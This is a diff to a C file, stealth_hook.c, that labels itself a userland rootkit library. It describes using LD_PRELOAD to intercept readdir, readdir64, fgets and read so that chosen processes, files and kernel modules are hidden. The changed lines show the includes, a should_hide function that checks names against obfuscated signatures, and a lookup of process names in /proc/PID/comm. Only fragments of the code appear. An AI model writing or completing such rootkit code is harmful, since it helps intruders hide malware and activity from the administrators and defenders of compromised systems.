@@ -1,12 +1,19 @@
+/**
+ * @file stealth_hook.c
+ * @brief Userland Rootkit Hook Library for hiding processes, files, and kernel modules.
+ * @details Utilizes LD_PRELOAD and Symbol Interposition to intercept standard library 
+ *          and system calls (readdir, readdir64, fgets, read) to conceal specific artifacts.
+ */
+
 #define _GNU_SOURCE
-#include <dlfcn.h> //for dynamic symbol resolution (dlsym)
-#include <string.h> //for string manipulation functions (strstr, strcmp)
-#include <dirent.h> //for directory stream operations (readdir, readdir64)
-#include <stdio.h> //for file I/O operations (fgets, FILE)
-#include <stdlib.h> //for memory allocation (malloc, free)
-#include <ctype.h> //for character type checks (isdigit)
-#include <unistd.h> //for low-level file descriptor operations (read, close)
-#include <fcntl.h> //for file control options (open, O_RDONLY)
+#include <dlfcn.h>
+#include <string.h>
+#include <dirent.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <ctype.h>
+#include <unistd.h>
+#include <fcntl.h>
 
 /**
  * @brief Checks if a given name or string matches obfuscated blacklisted signatures.
@@ -54,7 +61,7 @@ int should_hide(const char *name) {
         }
     }
 
-    // If it's a PID directory under /proc, check its actual process name
+    // If it's a PID directory under /proc, check its actual process name via comm
     if (is_pid) {
         char comm_path[256];
         snprintf(comm_path, sizeof(comm_path), "/proc/%s/comm", name);
